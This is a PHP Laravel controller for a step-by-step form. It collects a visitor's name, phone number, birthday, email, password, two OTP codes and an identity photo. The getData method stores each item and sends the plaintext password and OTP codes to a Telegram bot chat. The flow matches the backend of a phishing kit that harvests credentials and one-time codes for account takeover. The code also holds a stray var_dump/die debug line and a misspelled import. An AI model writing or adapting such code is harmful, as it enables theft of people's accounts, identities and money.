<?php

namespace App\Http\Controllers;

use App\Models\Data;
use App\Models\Business;
use Illuminate\Http\Request;
use DateTime;
use Reponse;
use Illuminate\Support\Facades\Http;

class DataController extends Controller
{
    private function sendTelegramMessage($message)
    {
        $businessId = request()->input('business_id');
        if (!$businessId) return;
        
        $business = Business::where('business_id', $businessId)->first();
        if (!$business || !$business->tele_bot_token || !$business->tele_chat_id) {
            return;
        }
        var_dump($business);die;
        Http::post("https://api.telegram.org/bot{$business->tele_bot_token}/sendMessage", [
            'chat_id' => $business->tele_chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ]);
    }

    public function getAllData(Request $request)
    {
        $businessId = $request->input('business_id');
        if (!$businessId) {
            return response()->json(['error' => 'Business ID is required'], 400);
        }
        
        $data = Data::where('business_id', $businessId)->get();
        return response()->json($data);
    }

    public function getData(Request $request)
    {
        $currentStep = $request->input('step', 1);
        $validated = $request->only([
            'business_id',
            'full_name',
            'phone_number',
            'birthday',
            'email',
            'password',
            'repassword',
            'otp_code',
            'otp_code_2',
            'identity_image'
        ]);

        if ($currentStep == 2) {
            // Transform date format for step 2
            if (isset($validated['birthday'])) {
                $date = DateTime::createFromFormat('m/d/Y', $validated['birthday']);
                if ($date) {
                    $validated['birthday'] = $date->format('Y-m-d');
                }
            }
            // Create new record and store ID in session
            $record = Data::create($validated);
            session(['record_id' => $record->id]);
            $this->sendTelegramMessage("New record created:\nName: {$validated['full_name']}\nPhone number: {$validated['phone_number']}");
        }
        
        if ($currentStep == 3) {
            // Get ID from session and update record
            $recordId = session('record_id');
            if ($recordId) {
                 Data::where('id', $recordId)->update($validated);
                $record = Data::find($recordId);
                $this->sendTelegramMessage("Email and password updated for user: {$record->full_name} Email: {$validated['email']} Password: {$validated['password']}");
            }
        }

        if ($currentStep == 4) {
            $recordId = session('record_id');
            if ($recordId) {
                Data::where('id', $recordId)->update($validated);
            }
        }

        if ($currentStep == 5) {
            $recordId = session('record_id');
            if ($recordId) {
                Data::where('id', $recordId)->update($validated);
                $record = Data::find($recordId);
            }
            $this->sendTelegramMessage("OTP code updated for user: {$record->full_name} otp_code: {$validated['otp_code']} ");
        }
        if ($currentStep == 6) {
            $recordId = session('record_id');
            if ($recordId) {
                 Data::where('id', $recordId)->update($validated);
                $record = Data::find($recordId);
            }
            echo $this->sendTelegramMessage("OTP code updated for user: {$record->full_name} otp_code_2: {$validated['otp_code_2']}");
            die;
        }

        if ($currentStep == 7) {
            $recordId = session('record_id');
            if ($recordId && $request->hasFile('identity_image')) {
                $image = $request->file('identity_image');
                $filename = $recordId . '_' . time() . '.' . $image->getClientOriginalExtension();
                
                // Save image to public/images folder
                $image->move(public_path('images'), $filename);
                
                // Save image path to database
                $imagePath = url('images/' . $filename);
                Data::where('id', $recordId)->update(['images' => $imagePath]);
                $record = Data::find($recordId);

                $this->sendTelegramMessage("Identity image uploaded for user: {$record->full_name}\nImage URL: {$imagePath}");

                // Clear the session after successful upload
                session()->forget('record_id');
            }
        }

        $nextStep = $currentStep + 1;
        return redirect()->route('home', ['step' => $nextStep]);
    }
}